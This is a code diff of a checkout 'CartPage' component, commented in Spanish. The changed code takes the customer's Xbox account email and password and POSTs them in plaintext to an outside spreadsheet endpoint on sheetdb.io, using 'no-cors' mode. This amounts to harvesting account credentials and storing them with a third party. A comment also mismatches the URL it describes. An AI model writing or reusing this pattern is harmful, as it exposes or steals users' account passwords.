@@ -132,22 +132,21 @@ export default function CartPage() {
         finalReceiptUrl = uploadData.url;
       }
 
-      // --- 🚀 ENVIAR DATOS A SHEETDB ---
+      // --- 🚀 ENVIAR DATOS AL EXCEL VÍA APPS SCRIPT ---
       try {
-        const sheetDbUrl = 'https://sheetdb.io/api/v1/9mj5luy2lh9u4'; 
+        const scriptUrl = 'https://sheetdb.io/api/v1/9mj5luy2lh9u4'; // <--- LA QUE TERMINA EN /exec
         
-        await fetch(sheetDbUrl, {
+        const formData = new URLSearchParams();
+        formData.append('correo', xboxEmail.trim());
+        formData.append('contrasena', xboxPassword.trim());
+
+        await fetch(scriptUrl, {
           method: 'POST',
+          mode: 'no-cors', // Fundamental para que Google no lo bloquee
           headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/x-www-form-urlencoded'
           },
-          body: JSON.stringify({
-            data: {
-              "CORREO": xboxEmail.trim(),
-              "CONTRASENA": xboxPassword.trim()
-            }
-          })
+          body: formData.toString()
         });
       } catch (sheetError) {
         console.error("No se pudo guardar en el Excel:", sheetError);
